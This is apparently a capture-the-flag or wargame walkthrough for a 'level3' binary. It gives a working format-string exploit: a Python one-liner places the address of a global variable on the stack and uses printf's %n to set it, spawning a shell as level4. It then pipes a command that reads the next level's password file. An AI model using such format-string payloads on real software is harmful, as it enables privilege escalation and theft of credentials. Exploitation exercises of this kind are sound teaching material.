# Walkthrough

## Disassembling the executable

see source.c

## Analysis

In order to execute /bin/sh as level4, the global variable m must be equal to 64.

We exploited the format string of printf to put the address of the variable m in the stack, and we used the %n function of printf to modify the value held in that address

```
(python -c "print('\x8c\x98\x04\x08 %p %p %p abcdefghijklmnopqrstuvwxyz12345%n')"; echo 'cat /home/user/level4/.pass
') | ./level3
```
